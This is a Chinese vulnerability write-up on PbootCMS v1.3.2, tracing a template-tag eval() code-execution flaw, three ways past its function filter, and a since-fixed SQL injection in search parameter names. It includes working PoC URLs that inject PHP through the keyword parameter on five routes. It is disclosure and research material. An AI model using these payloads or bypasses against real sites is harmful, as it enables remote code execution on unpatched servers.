# PbootCMS v1.3.2命令执行和SQL注入漏洞

阅读量 **447748**

|评论 **3**

发布时间 : 2018-12-04 16:20:50

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01a76d4e517d69dab9.png)

## 0x00

前几天看到个PbootCMS，然后打算审计一波，网上找了这个cms之前的漏洞，看到有表哥审计过这个文章了，[https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=45649&page=1#pid506915](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=45649&page=1#pid506915)，可能别的表哥也发现了这个漏洞，这里简单说下我的思路。

## 0x01 命令执行漏洞

这个漏洞目前找到5处，新版本和老版本不同的是新版本加了过滤，但是可以绕过，漏洞函数在ParserController.php里。在2330多行这里，parserIfLabel()方法中调用了eval函数。而且前面有过滤。先忽略过滤内容，一会回来看，看下哪里调用了parserfLabel方法。

![](https://nosec.org/avatar/uploads/attach/image/27efe09a4120c792efd515d543e083aa/1.png)

找到了parserIfLabel()方法，而且从下面可以看到在ParserController.php中parserAfter()方法调用了parserIfLabel()方法。

![](https://nosec.org/avatar/uploads/attach/image/49f87766af98963637b738a861770efe/02.png)

![](https://nosec.org/avatar/uploads/attach/image/f3856a324272b5fb33359541cd922d42/2.png)

再跟进下parserAfter()方法。根据注释和代码可以分析出这是这个模板在前端渲染的时候，解析标签步骤如下：解析框架标签，解析前置公共标签，解析当前位置标签，解析分类信息标签，解析内容标签，解析公共后置标签。问题出在最后一步“解析公共后置标签”这里，这里存在eval()函数调用。这个函数存在的地方其实可以用一句话表示：

只要存在把用户输入输出到前端的地方，就会有代码执行漏洞。

![](https://nosec.org/avatar/uploads/attach/image/58ed24f088f511b107989fa4745585c9/3.png)

找到漏洞点，看下过滤。回到parserIfLabel()方法，可以看到“$pattern =
‘/{pboot:if(([^}]+))}([\s\S]*?){\/pboot:if}/’;”这个正则把标签 if
后面的内容取了出来，然后经过过滤并执行。这里主要看下最严重的过滤，在第2316-2331行这里。这里会用正则取出“(”前面的字符串(不包括特殊符号)，也就是说@eval(‘phpinfo()’)，会取出eval和phpinfo两个字符串，然后调用function_exists()函数，如果这两个方法存在，就不会进入eval()里面。

    
    
    // 带有函数的条件语句进行安全校验
                    if (preg_match_all('/([\w]+)([\s]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if ((function_exists($value) || preg_match('/^eval$/i', $value)) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
    
                    // 如果有危险函数，则不解析该IF
                    if ($danger) {
                        continue;
                    } else {
                        $matches[1][$i] = decode_string($matches[1][$i]); // 解码条件字符串
                    }

![](https://nosec.org/avatar/uploads/attach/image/54b970f0a4b08787f0642efcdb45e303/4.png)

![](https://nosec.org/avatar/uploads/attach/image/ab0036ccb9a90021449d69cb6fcd189a/05.png)

这个是新版本增加的过滤，这里有很多绕过方法，下面说三个：

> 1
> 使用空字节，在php中，phpinfo()可以用phpinfo%01()~phpinfo%19()代替，就可以使function_exists()方法返回False。这个绕过只有在留言的地方可以用，经过测试只有那里会进行url解码。
>
> 2 转义，phpinfo()，换成phpinf\o()、php\info() 之类的，function_exists()方法也会返回False。
>
> 3 混淆，代码为$a=$_GET[b];$a();，传参的时候加上&b=phpinfo。

下面找一下调用parserAfter()方法的地方，Index，About，Content，List，Search

![](https://nosec.org/avatar/uploads/attach/image/75498fbe2ac2bea8c1e724a949901874/5.png)

验证下是否可以控制前端输出，以Index试一下，可以看到已经可以控制前端输出，说明存在漏洞

![](https://nosec.org/avatar/uploads/attach/image/20e2bab9144b19653d24f6c6d66317da/6.png)

构造payload：
[http://127.0.0.1/PbootCMS/index.php/index/index?keyword=](http://127.0.0.1/PbootCMS/index.php/index/index?keyword=){pboot:if(1)$a=$_GET[b];$a();;//)})}}{/pboot:if}&b=phpinfo

![](https://nosec.org/avatar/uploads/attach/image/1f95bd3731bb6f0583685e9b6c6f7a8e/7.png)

其他几处同理

![](https://nosec.org/avatar/uploads/attach/image/0d060e33f25a42289be79474599056b4/08.png)

![](https://nosec.org/avatar/uploads/attach/image/d27ede171a1492101c8e30565886e02c/9.png)

POC:

    
    
    http://127.0.0.1/PbootCMS/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo
    
    http://127.0.0.1/PbootCMS/index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo
    
    http://127.0.0.1/PbootCMS/index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo
    
    http://127.0.0.1/PbootCMS/index.php/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo
    
    http://127.0.0.1/PbootCMS/index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo

留言那里还有一处，但是需要管理员开启留言展示，利用有限。

## 0x02 SQL注入漏洞

这个注入在1.3.2已经修复了，简单说下，漏洞存在于ParserController.php中parserSearchLabel()方法。新版本已经修复，参数名不能含有除了“-”，“.”外的特殊字符。

![](https://nosec.org/avatar/uploads/attach/image/494e18504e55e2cee0f64e21addda600/10.png)

![](https://nosec.org/avatar/uploads/attach/image/95e60fecfd26670bb2316824c84aa0aa/11.png)

这个注入点在参数名，前面有AND，可以用报错注入。

###  0x03 漏洞POC

目前FOFA客户端平台已经更新该漏洞检测POC。

![](https://nosec.org/avatar/uploads/attach/image/bd011f849dd9aa1d5fb5f919f0e1c231/fofa.png)

本文由白帽汇编写，转载请注明 来自白帽汇Nosec：<https://nosec.org/home/detail/2001.html>

查看更多安全动态，请访问[[nosec.org](https://nosec.org)]

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **白帽汇** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/167138](/post/id/167138)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [Web安全](/tag/Web安全)
  * [CMS](/tag/CMS)

 **+1** __12赞

 __收藏

![](https://p4.ssl.qhimg.com/t01cbcea083daf5b1a3.png) 白帽汇

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

